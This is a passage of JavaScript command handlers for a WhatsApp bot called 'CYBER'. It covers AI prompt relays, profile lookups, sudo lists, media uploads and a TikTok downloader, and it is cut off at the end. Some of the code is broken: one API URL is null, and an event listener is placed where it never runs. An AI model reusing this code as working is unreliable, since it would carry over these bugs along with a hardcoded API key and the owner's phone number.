        let res = await axios.get(`https://registry.npmjs.org/${encodeURIComponent(text)}`);
        let data = res.data;
        
        if (!data.name) return reply("🔍 *Package not found*");
        
        let latestVersion = data['dist-tags']?.latest;
        let info = data.versions[latestVersion];
        
        let npmInfo = `📦 *CYBER NPM*\n\n` +
            `📌 *${data.name}* v${latestVersion}\n` +
            `📝 ${data.description || "No description"}\n` +
            `👤 ${info?.author?.name || "Unknown author"}\n` +
            `📦 License: ${info?.license || "Unknown"}\n` +
            `🔗 https://www.npmjs.com/package/${data.name}`;
        
        reply(npmInfo);
    } catch (e) {
        console.error(e);
        reply("⚠️ *NPM fetch failed* • Registry might be down");
    }
}
break;

case 'poem': {
    if (!text) return reply(`📝 *Usage:* ${command} love under stars`);
    try {
        const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nWrite a beautiful, original, short poem (8-12 lines) about: ${text}. Use vivid imagery and emotion.`;
        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
        reply(`📝 *CYBER Poem*\n\n${res.data}`);
    } catch (e) {
        reply("⚠️ *Poet is on strike* • Try again later");
    }
}
break;

case 'metabcn-ai':
case 'metaai': {
    if (!text) return reply(`🤖 *Usage:* ${command} your question`);
    try {
        const langPromptMeta = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user writes in Roman Urdu (English letters for Urdu/Hindi words like 'kya', 'hai', 'mujhe'), respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script. ALWAYS match the user's exact script style.\n\nUser: ${text}`;
        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(langPromptMeta)}`, { timeout: 25000 });
        reply(`🤖 *CYBER AI*\n\n${res.data}`);
    } catch (e) {
        reply("⚠️ *AI is thinking too hard* • Try again later");
    }
}
break;

case 'codeai': {
    if (!text) return reply(`👨‍💻 *Usage:* ${command} write a Python function`);
    try {
        const prompt = `CRITICAL: Provide code first, then explanation ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu for explanation, respond in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nYou are a coding assistant. Provide clean, working code with brief explanation:\n\n${text}`;
        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
        reply(`👨‍💻 *CYBER Code*\n\n${res.data}`);
    } catch (e) {
        reply("⚠️ *Code generator crashed* • Try again later");
    }
}
break;

case 'triviaai':
case 'quiz': {
    try {
        const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nGenerate a random interesting trivia question with 4 multiple choice options labeled A) B) C) D). At the end reveal the correct answer. Format exactly like:\n\n❓ Question\n\nA) option\nB) option\nC) option\nD) option\n\n✅ Answer: X) correct`;
        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
        reply(`🎲 *CYBER Quiz*\n\n${res.data}`);
    } catch (e) {
        reply("⚠️ *Quiz machine broke* • Try again later");
    }
}
break;

case 'storyai': {
    if (!text) return reply(`📖 *Usage:* ${command} a brave dog in space`);
    try {
        const prompt = `CRITICAL: Respond ONLY in the EXACT same language and script the user wrote in. If user uses Roman Urdu, respond ONLY in Roman Urdu using English letters. NEVER use Hindi Devanagari script. NEVER use formal Urdu Nastaliq script.\n\nWrite a creative short story (150 words max) about: ${text}`;
        const res = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(prompt)}`, { timeout: 25000 });
        reply(`📖 *CYBER Story AI*\n\n${res.data}`);
    } catch (e) {
        reply("❌ *Story generator failed* • Try again later");
    }
}
break;

case 'photoai': {
    if (!text) return reply(`🖼️ *Usage:* ${prefix + command} a cat wearing sunglasses`);
    
    try {
        let url = `https://image.pollinations.ai/prompt/${encodeURIComponent(text)}`;
        
        await devtrust.sendMessage(m.chat, 
            addNewsletterContext({
                image: { url },
                caption: `🎨 *CYBER AI Art*\n\nPrompt: ${text}`
            }), 
            { quoted: m }
        );
    } catch (e) {
        console.error(e);
        reply("❌ *AI art generator failed* • Try again later");
    }
}   
break;

case 'welcome': {
    // --- Permission & Context Checks ---
    if (!isCreator) {
        return reply(`🔒 *CYBER Welcome*\n\nThis command is restricted to the bot owner.`);
    }
    if (!m.isGroup) {
        return reply(`👥 *CYBER Welcome*\n\nThis command can only be used within groups.`);
    }

    // --- Toggle Logic (On/Off) ---
    if (args[0] === 'on') {
        setSetting(m.chat, "welcome", true);
        return reply(`✅ *CYBER Welcome*\n\nWelcome messages have been activated for this group. New members will now be greeted.`);
    } 
    else if (args[0] === 'off') {
        setSetting(m.chat, "welcome", false);
        return reply(`❌ *CYBER Welcome*\n\nWelcome messages have been deactivated for this group.`);
    } 
    else if (args[0] === 'set') {
        // --- New Feature: Set Custom Welcome Message ---
        const customMessage = args.slice(1).join(' ');
        if (!customMessage) {
            return reply(`📝 *CYBER Welcome*\n\nPlease provide a welcome message after the command.\n\nExample:\n${prefix}welcome set Welcome to the group, @user!`);
        }
        setSetting(m.chat, "welcomeMessage", customMessage);
        return reply(`✅ *CYBER Welcome*\n\nCustom welcome message has been set.`);
    }
    else {
        // --- Default: Display Help ---
        reply(`⚙️ *CYBER Welcome — Settings*\n\n` +
              `▸ *${prefix}welcome on* — Enable welcome messages\n` +
              `▸ *${prefix}welcome off* — Disable welcome messages\n` +
              `▸ *${prefix}welcome set <text>* — Set a custom welcome message (use @user to tag)\n\n` +
              `_Default message: "Welcome @user to the group!_"`);
    }
}
break;

// [ANTICALL] — handler is registered in pair.js (top-level) not here

// =========================================================================
// Place this function outside of your case blocks, likely in a main handler
// This listens for new group participants
// =========================================================================
devtrust.ev.on('group-participants.update', async (update) => {
    const { id, participants, action } = update;

    // Only proceed if the action is 'add' (someone joined)
    if (action !== 'add') return;

    // Check if welcome messages are enabled for this group
    const welcomeEnabled = getSetting(id, "welcome"); // You need to implement this getter
    if (!welcomeEnabled) return;

    // Fetch the custom message or use default
    let customMessage = getSetting(id, "welcomeMessage"); // You need to implement this getter
    if (!customMessage) {
        customMessage = "Welcome @user to the group!"; // Default message
    }

    const groupMetadata = await devtrust.groupMetadata(id);
    const groupName = groupMetadata.subject;

    // Process each new participant
    for (let jid of participants) {
        try {
            // --- Attempt to fetch the new user's profile picture ---
            let profilePicUrl;
            try {
                profilePicUrl = await devtrust.profilePictureUrl(jid, 'image');
            } catch {
                // Fallback image if profile picture can't be fetched
                profilePicUrl = 'https://files.catbox.moe/smv12k.jpeg';
            }

            // --- Personalize the message ---
            // Replace @user with the actual mention
            let personalizedMessage = customMessage.replace('@user', `@${jid.split('@')[0]}`);
            
            // You can add more placeholders here, e.g., @group for group name
            personalizedMessage = personalizedMessage.replace('@group', groupName);

            // --- Send the welcome message with the image ---
            await devtrust.sendMessage(id, {
                image: { url: profilePicUrl },
                caption: `👋 *Welcome to ${groupName}*\n\n${personalizedMessage}`,
                mentions: [jid] // This ensures the user is tagged
            });

        } catch (error) {
            console.error(`Error sending welcome message for ${jid}:`, error);
        }
    }
});

case 'ffstalk': {
    if (!args[0]) return reply(`🎮 *Usage:* ${command} FF_ID\nExample: ${command} 8533270051`);
    
    const ffId = args[0];
    const apiUrl = null /* FreeFire API disabled */;
    
    try {
        await devtrust.sendMessage(m?.chat, { react: { text: `🔍`, key: m?.key } });
        
        const response = await axios.get(apiUrl);
        const data = response.data;
        
        if (!data.status) return reply("❌ *Player not found* • Check the ID");
        
        const { nickname, region, open_id, img_url } = data.data;
        
        const message = `🎮 *CYBER Free Fire*\n\n` +
            `👤 *${nickname}*\n` +
            `🆔 ID: ${open_id}\n` +
            `🌏 Region: ${region}`;
        
        await devtrust.sendMessage(m?.chat, 
            addNewsletterContext({
                image: { url: img_url },
                caption: message
            }), 
            { quoted: m }
        );
        
    } catch (error) {
        console.error('FF Stalk Error:', error);
        reply("❌ *Free Fire stalk failed* • Try again later");
    }
    break;
}

case 'npmstalk': {
    if (!text) return reply(`📦 *Usage:* ${prefix}npmstalk package-name\nExample: ${prefix}npmstalk express`);
    
    await devtrust.sendMessage(m.chat, { react: { text: `📦`, key: m.key } });
    
    try {
        const res = await axios.get(`https://registry.npmjs.org/${encodeURIComponent(text.trim())}`, {
            timeout: 10000
        });
        const pkg = res.data;
        
        if (!pkg || !pkg.name) {
            return reply(`🔍 *Package "${text}" not found on npm*`);
        }
        
        const latestVersion = pkg['dist-tags']?.latest || 'N/A';
        const description = pkg.description || 'No description';
        const author = pkg.author?.name || pkg.maintainers?.[0]?.name || 'Unknown';
        const createdAt = pkg.time?.created ? new Date(pkg.time.created).toDateString() : 'N/A';
        const updatedAt = pkg.time?.modified ? new Date(pkg.time.modified).toDateString() : 'N/A';
        const totalVersions = Object.keys(pkg.versions || {}).length;
        const homepage = pkg.homepage || pkg.repository?.url || 'N/A';
        const license = pkg.license || 'N/A';
        
        const info = `📦 *CYBER NPM Stats*\n\n` +
            `📌 *${pkg.name}*\n` +
            `📝 ${description}\n\n` +
            `🆚 *Latest:* v${latestVersion}\n` +
            `📬 *Total versions:* ${totalVersions}\n` +
            `👤 *Author:* ${author}\n` +
            `📜 *License:* ${license}\n` +
            `🪐 *Created:* ${createdAt}\n` +
            `🔥 *Updated:* ${updatedAt}\n` +
            `🔗 ${homepage !== 'N/A' ? homepage : 'npmjs.com/package/' + pkg.name}`;
        
        reply(info);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (e) {
        console.error('NPM Info Error:', e);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *Package not found* • Check the package name and try again`);
    }
    break;
}
case 'githubstalk': {
    if (!text) return reply(`👤 *Usage:* ${prefix}githubstalk username\nExample: ${prefix}githubstalk microsoft`);
    
    await devtrust.sendMessage(m.chat, { react: { text: `🔍`, key: m.key } });
    
    try {
        const data = await githubstalk(text.trim());
        
        const info = `👤 *CYBER GitHub Stalk*\n\n` +
            `📌 *${data.username}* ${data.nickname ? '(' + data.nickname + ')' : ''}\n` +
            `📝 ${data.bio || 'No bio'}\n\n` +
            `🆔 ID: ${data.id}\n` +
            `📦 Public Repos: ${data.public_repo}\n` +
            `📜 Public Gists: ${data.public_gists}\n` +
            `👥 Followers: ${data.followers}  |  Following: ${data.following}\n` +
            `🏢 Company: ${data.company || 'N/A'}\n` +
            `📍 Location: ${data.location || 'N/A'}\n` +
            `🔗 ${data.url}`;
        
        if (data.profile_pic) {
            await devtrust.sendMessage(m.chat, {
                image: { url: data.profile_pic },
                caption: info
            }, { quoted: m });
        } else {
            reply(info);
        }
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (e) {
        console.error('GitHub Stalk Error:', e);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *GitHub user not found* • Check the username`);
    }
    break;
}

case 'mlstalk': {
    if (!args[0]) return reply(`🎮 *Usage:* ${prefix}mlstalk <id> <zoneId>\nExample: ${prefix}mlstalk 12345678 1234`);
    
    const mlId = args[0];
    const mlZone = args[1] || '1234';
    
    await devtrust.sendMessage(m.chat, { react: { text: `🔍`, key: m.key } });
    
    try {
        const data = await mlstalk(mlId, mlZone);
        
        const info = `🎮 *CYBER Mobile Legends Stalk*\n\n` +
            `👤 *${data.userName || data.nickname || 'Unknown'}*\n` +
            `🆔 ID: ${mlId}\n` +
            `🌍 Zone: ${mlZone}\n` +
            `📊 Level: ${data.level || 'N/A'}\n` +
            `🏆 Rank: ${data.rank || 'N/A'}`;
        
        reply(info);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        
    } catch (e) {
        console.error('ML Stalk Error:', e);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *ML player not found* • Check ID and Zone ID`);
    }
    break;
}

case "calculator": {
    if (!text) return reply(`🧮 *CYBER Calculator*\n\nUsage: ${prefix}calculator [expression]\nExample: ${prefix}calculator 25*4+100\n\nOperators: + - * / × ÷ ( ) π e`);
    try {
        const val = text
            .replace(/[^0-9\-\/+*×÷πEe()piPI\s.]/g, '')
            .replace(/×/g, '*')
            .replace(/÷/g, '/')
            .replace(/π|pi/gi, 'Math.PI')
            .replace(/\be\b/gi, 'Math.E');

        const format = val
            .replace(/Math\.PI/g, 'π')
            .replace(/Math\.E/g, 'e')
            .replace(/\//g, '÷')
            .replace(/\*/g, '×');

        const result = Function('"use strict"; return (' + val + ')')();
        
        if (result === null || result === undefined || typeof result !== 'number' || !isFinite(result)) throw new Error('Invalid calculation');
        
        reply(`🧮 *CYBER Math*\n\n${format} = *${result}*`);
    } catch (e) {
        reply(`❌ *Invalid expression*\nUse: 0-9, +, -, *, /, ×, ÷, π, e, (, )\nExample: ${prefix}calculator 5+3*2`);
    }
    break;
}

case 'setsudo': case 'sudo': case 'addsudo': {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');

    let number;
    if (quoted) {
        number = quoted.sender.split('@')[0];
    } else if (args[0]) {
        number = args[0];
    }

    if (!number || !/^\d+$/.test(number)) {
        return reply('❌ *Valid number required* • Reply or provide number');
    }

    const jid = number + '@s.whatsapp.net';
    const sudoList = loadSudoList();

    if (sudoList.includes(jid)) 
        return reply(`⚠️ @${number} *already in sudo list*`);
    
    sudoList.push(jid);
    saveSudoList(sudoList);

    reply(`✅ @${number} *added to sudo list*`);
}
break;

case 'delsudo': {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');

    let number;
    if (quoted) {
        number = quoted.sender.split('@')[0];
    } else if (args[0]) {
        number = args[0];
    }

    if (!number || !/^\d+$/.test(number)) {
        return reply('❌ *Valid number required*');
    }

    const jid = number + '@s.whatsapp.net';
    const sudoList = loadSudoList();

    if (!sudoList.includes(jid)) 
        return reply(`⚠️ @${number} *not in sudo list*`);
    
    const updatedList = sudoList.filter((user) => user !== jid);
    saveSudoList(updatedList);

    reply(`✅ @${number} *removed from sudo list*`);
}
break;

case 'getsudo': case 'listsudo': {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    const sudoList = loadSudoList();
    if (sudoList.length === 0) 
        return reply('📭 *Sudo list is empty*');

    const suCYBERumbers = sudoList.map((jid) => jid.split('@')[0]).join('\n• ');
    reply(`👥 *Sudo List*\n\n• ${suCYBERumbers}`);
}
break;

case "autobio": {
    reply("⚠️ *autobio command permanently disabled* — it was causing 2 minute reply delays.");
}
break;

case "setbio":
case "setabout": {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    const newBio = args.join(' ').trim();
    if (!newBio) return reply(`⚙️ *Usage:* ${prefix}setbio <text>\n\n*Example:* ${prefix}setbio CYBER Bot Active 🔥`);
    try {
        await devtrust.updateProfileStatus(newBio);
        reply(`✅ *Bio updated!*\n\n📝 *New Bio:* ${newBio}`);
    } catch (err) {
        reply(`❌ *Bio update failed:* ${err.message}`);
    }
}
break;

case "autoread": {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autoread on/off");
    
    if (args[0].toLowerCase() === "on") {
        setSetting(m.sender, "autoread", true);
        reply("✅ *Auto read enabled* • Messages auto-read");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.sender, "autoread", false);
        reply("❌ *Auto read disabled*");
    } else reply("⚙️ *Usage:* autoread on/off");
}
break;

case "autoviewstatus": {
    if (!args[0]) return reply("⚙️ *Usage:* autoviewstatus on/off");
    
    if (args[0].toLowerCase() === "on") {
        setSetting(botNumber, "autoViewStatus", true);
        reply("✅ *Auto view status enabled* • Stories auto-viewed");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(botNumber, "autoViewStatus", false);
        reply("❌ *Auto view status disabled*");
    } else reply("⚙️ *Usage:* autoviewstatus on/off");
}
break;

case "autoreactstatus":
case "autostatusreact": {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) return reply("⚙️ *Usage:* autostatusreact on/off\n\nAuto reacts to statuses with random emojis.");
    if (args[0].toLowerCase() === "on") {
        setSetting(botNumber, "autoStatusReact", true);
        reply("✅ *Auto status react enabled* • Will react to statuses with random emojis");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(botNumber, "autoStatusReact", false);
        reply("❌ *Auto status react disabled*");
    } else reply("⚙️ *Usage:* autostatusreact on/off");
}
break;

case "autostatusreply": {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) return reply("⚙️ *Usage:* autostatusreply on/off [message]\n\nExample: autostatusreply on Nice status! 🔥");
    if (args[0].toLowerCase() === "on") {
        const _replyMsg = args.slice(1).join(' ').trim() || '👀 Seen!';
        setSetting(botNumber, "autoStatusReply", true);
        setSetting(botNumber, "autoStatusReplyMsg", _replyMsg);
        reply(`✅ *Auto status reply enabled*\n\n📝 *Reply message:* ${_replyMsg}`);
    } else if (args[0].toLowerCase() === "off") {
        setSetting(botNumber, "autoStatusReply", false);
        reply("❌ *Auto status reply disabled*");
    } else reply("⚙️ *Usage:* autostatusreply on/off [message]");
}
break;

case "autotyping": {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autotyping on/off");
    if (!m.isGroup) return reply("👥 *Groups only*");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "autoTyping", true);
        reply("✅ *Auto typing enabled* • Bot shows typing");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "autoTyping", false);
        reply("❌ *Auto typing disabled*");
    } else reply("⚙️ *Usage:* autotyping on/off");
}
break;

case "autorecording": {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autorecording on/off");
    if (!m.isGroup) return reply("👥 *Groups only*");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "autoRecording", true);
        reply("✅ *Auto recording enabled* • Bot shows recording");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "autoRecording", false);
        reply("❌ *Auto recording disabled*");
    } else reply("⚙️ *Usage:* autorecording on/off");
}
break;

case "autorecordtype": {
    if (!isAdmins && !isCreator) 
        return reply('🔒 *Admins/Owner only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autorecordtype on/off");
    if (!m.isGroup) return reply("👥 *Groups only*");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "autoRecordType", true);
        reply("✅ *Auto record type enabled* • Random typing/recording");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "autoRecordType", false);
        reply("❌ *Auto record type disabled*");
    } else reply("⚙️ *Usage:* autorecordtype on/off");
}
break;

case "autoreact": {
    if (!args[0]) return reply("⚙️ *Usage:* autoreact on/off");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "autoReact", true);
        reply("✅ *Auto react enabled* • Messages get random reactions");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "autoReact", false);
        reply("❌ *Auto react disabled*");
    } else reply("⚙️ *Usage:* autoreact on/off");
}
break;

case "ban": {
    if (!isCreator) return reply('🔒 *Owner only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* ban @user");
    
    let user = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    setSetting(user, "banned", true);
    reply(`🚫 @${user.split("@")[0]} *banned*`, [user]);
}
break;

case "unban": {
    if (!isCreator) return reply('🔒 *Owner only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* unban @user");
    
    let user = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    setSetting(user, "banned", false);
    reply(`✅ @${user.split("@")[0]} *unbanned*`, [user]);
}
break;

case "autoreply": {
    if (!isCreator) return reply('🔒 *Owner only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* autoreply on/off");
    
    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "feature.autoreply", true);
        reply("✅ *Auto reply enabled* • Bot responds to keywords");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "feature.autoreply", false);
        reply("❌ *Auto reply disabled*");
    } else reply("⚙️ *Usage:* autoreply on/off");
}
break;

case "antibadword": {
    if (!isCreator && !isSudo) 
        return reply('🔒 *Owner/Sudo only*');
    
    if (!args[0]) return reply("⚙️ *Usage:* antibadword on/off");
    
    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "feature.antibadword", true);
        reply("✅ *Anti bad word enabled* • Bad words filtered");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "feature.antibadword", false);
        reply("❌ *Anti bad word disabled*");
    } else reply("⚙️ *Usage:* antibadword on/off");
}
break;

case "antibot": {
    if (!isCreator && !isSudo)
        return reply('🔒 *Owner/Sudo only*');

    if (!args[0]) return reply("⚙️ *Usage:* antibot on/off");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "feature.antibot", true);
        reply("✅ *Anti bot enabled* • Bot prefixes blocked");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "feature.antibot", false);
        reply("❌ *Anti bot disabled*");
    } else reply("⚙️ *Usage:* antibot on/off");
}
break;

case "chatbot": {
    if (!isCreator) return reply('🔒 *Owner only*');

    if (!args[0]) return reply("🤖 *Usage:* chatbot on/off\n\n• `on` — Bot auto-replies to all DMs & mentions in groups\n• `off` — Disable auto-reply mode");

    const state = args[0].toLowerCase();
    if (state === "on") {
        setSetting(botNumber, "chatbot", true);
        reply("🤖 *Chatbot ON*\n\n✅ Bot will now auto-reply to:\n• All private DMs\n• All @mentions in groups\n\n_Type `.chatbot off` to disable_");
    } else if (state === "off") {
        setSetting(botNumber, "chatbot", false);
        reply("❌ *Chatbot OFF*\n\nBot auto-reply mode disabled.");
    } else {
        reply("⚙️ *Usage:* chatbot on/off");
    }
}
break;

case "owner": {
    const ownerName = "*NIZAMANI*";
    const ownerNumber = "8615507967005";
    const displayTag = "GAME CHANGER";

    let vcard = `BEGIN:VCARD
VERSION:3.0
FN:${ownerName}
TEL;type=CELL;type=VOICE;waid=${ownerNumber}:+${ownerNumber}
END:VCARD`;

    let caption = `👑 *CYBER Owner*\n\n📱 wa.me/${ownerNumber}\n💬 DM for support/requests`;

    await devtrust.sendMessage(m.chat, { 
        contacts: { displayName: displayTag, contacts: [{ vcard }] } 
    }, { quoted: m });

    await devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            text: caption,
            mentions: [m.sender]
        }), 
        { quoted: m }
    );
}
break;

case "repo": {
    const waChannel  = "https://whatsapp.com/channel/0029VbC0knY72WU0QUNAid3B";

    let caption = `📂 *CYBER Repository*\n\n` +
        `📢 Updates:\n${waChannel}`;

    await devtrust.sendMessage(m.chat, 
        addNewsletterContext({
            text: caption,
            mentions: [m.sender]
        }), 
        { quoted: m }
    );
}
break;

case 'url':
case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return reply(`🖼️ *Reply to an image/video* with ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply('❌ *Only images/MP4 supported*');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply('❌ *Download failed*');
    }

    const uploadImage = require('./allfunc/Data6');
    const uploadFile = require('./allfunc/Data7');

    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return reply('❌ *Upload failed*');
    }

    reply(`✅ *Uploaded*\n${link}`);
}
break;  // ← 'url' case ENDS here

// ============ UPLOAD TO CATBOX FUNCTION ============
// This goes HERE - between cases, available to ALL commands
// ============ UPLOAD TO CATBOX FUNCTION ============
async function uploadToCatbox(buffer) {
    const FormData = require('form-data');
    
    // Create temp directory if it doesn't exist
    if (!fs.existsSync('./tmp')) {
        fs.mkdirSync('./tmp', { recursive: true });
    }
    
    const tempFile = './tmp/upload_' + Date.now() + '.jpg';
    let result = null;
    
    try {
        // Write buffer to temp file
        fs.writeFileSync(tempFile, buffer);
        
        // Try Catbox first
        try {
            const formData = new FormData();
            formData.append('fileToUpload', fs.createReadStream(tempFile));
            formData.append('reqtype', 'fileupload');
            
            const response = await axios.post('https://catbox.moe/user/api.php', formData, {
                headers: {
                    ...formData.getHeaders(),
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxContentLength: Infinity,
                maxBodyLength: Infinity,
                timeout: 30000
            });
            
            if (response.data && response.data.startsWith('https://')) {
                result = response.data;
                console.log('✅ Catbox upload successful');
            }
        } catch (catboxError) {
            console.log('Catbox failed, trying Telegraph...');
        }
        
        // If Catbox failed, try Telegraph
        if (!result) {
            try {
                const telegraphResponse = await axios.post('https://telegra.ph/upload', buffer, {
                    headers: {
                        'Content-Type': 'image/jpeg'
                    },
                    timeout: 30000
                });
                
                if (telegraphResponse.data && 
                    telegraphResponse.data[0] && 
                    telegraphResponse.data[0].src) {
                    result = 'https://telegra.ph' + telegraphResponse.data[0].src;
                    console.log('✅ Telegraph upload successful');
                }
            } catch (telegraphError) {
                console.log('Telegraph failed too');
            }
        }
        
        // If both failed, try one more service
        if (!result) {
            try {
                // Convert buffer to base64
                const base64 = buffer.toString('base64');
                const imgbbResponse = await axios.post('https://api.imgbb.com/1/upload', {
                    key: 'f2cc2bc5b9d7e9e8b7a5d4a3c2b1e0f9', // Public demo key - rate limited
                    image: base64
                }, { timeout: 30000 });
                
                if (imgbbResponse.data && 
                    imgbbResponse.data.data && 
                    imgbbResponse.data.data.url) {
                    result = imgbbResponse.data.data.url;
                    console.log('✅ ImgBB upload successful');
                }
            } catch (imgbbError) {
                console.log('All upload services failed');
            }
        }
        
        // Clean up temp file
        try { fs.unlinkSync(tempFile); } catch (e) {}
        
        if (!result) {
            throw new Error('All upload services failed');
        }
        
        return result;
        
    } catch (error) {
        console.error('Upload error:', error);
        // Clean up temp file if it exists
        try { 
            if (fs.existsSync(tempFile)) {
                fs.unlinkSync(tempFile); 
            }
        } catch (e) {}
        throw error;
    }
}
// ====================================================
// ====================================================

// Now 'removebg' can use the function above
case "removebg": {
    // Check if there's a quoted message
    if (!m.quoted) {
        return await reply("🖼️ *Reply to an image with .removebg*\nExample: Reply to any image and type .removebg");
    }
    
    // Get the quoted message
    const quotedMsg = m.quoted;
    
    // Check if it's an image
    const mime = (quotedMsg.msg || quotedMsg).mimetype || '';
    const isImage = /image\/(png|jpe?g|gif|webp)/.test(mime);
    
    if (!isImage) {
        return await reply("❌ *That's not an image.* Reply to a JPG/PNG image.");
    }

    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        
        await reply(`🔍 *Removing background...*`);
        
        // Download the image
        let media = await quotedMsg.download();
        
        // Upload to temporary hosting
        let uploadedUrl = await uploadToCatbox(media);
        
        if (!uploadedUrl) {
            throw new Error('Upload failed');
        }
        
        // Call remove.bg API (set REMOVEBG_API_KEY in env vars for this to work)
        const _rmbgKey = process.env.REMOVEBG_API_KEY || process.env.REMOVE_BG_API_KEY || '';
        if (!_rmbgKey) {
            throw new Error('REMOVEBG_API_KEY not set in environment variables. Get a free key at remove.bg');
        }
        // Send image URL to remove.bg (form-urlencoded, returns binary PNG)
        const _rmbgRes = await axios.post(
            'https://api.remove.bg/v1.0/removebg',
            `image_url=${encodeURIComponent(uploadedUrl)}&size=auto`,
            {
                headers: {
                    'X-Api-Key': _rmbgKey,
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                responseType: 'arraybuffer',
                timeout: 30000,
            }
        );
        const _rmbgBuf = Buffer.from(_rmbgRes.data);
        if (!_rmbgBuf || _rmbgBuf.length < 100) throw new Error('remove.bg returned empty response');
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: _rmbgBuf,
                caption: "✨ *Background Removed*\n_Powered by remove.bg_"
            }),
            { quoted: m }
        );
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        console.error('RemoveBG error:', e.message, e.response?.status);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        await reply("⚠️ *Failed to remove background.* The service might be down. Try again later.");
    }
}
break;

case 'tiktok':
case 'tt': {
    if (!text) return reply(`🎵 *Usage:* ${prefix + command} <tiktok link>\nExample: ${prefix + command} https://www.tiktok.com/@user/video/123`);
    if (!text.includes('tiktok.com') && !text.includes('vm.tiktok') && !text.includes('vt.tiktok')) {
        return reply(`❌ *Invalid TikTok link* • Send a valid TikTok URL`);
    }

    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        let videoUrl = null;
        let audioUrl = null;
        let videoTitle = 'TikTok Video';

        // PRIMARY: tikwm.com — reliable no-watermark API
        try {
            const r1 = await axios.post('https://www.tikwm.com/api/', 
                new URLSearchParams({ url: text, count: 12, cursor: 0, hd: 1 }),
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 15000 }
            );
            const d1 = r1.data?.data;
            if (d1?.play) {
                videoUrl = d1.hdplay || d1.play; // No-watermark HD link
                audioUrl = d1.music;
                videoTitle = d1.title || 'TikTok Video';
            }
        } catch (_) {}

        // FALLBACK: tiklydown API
        if (!videoUrl) {
            try {
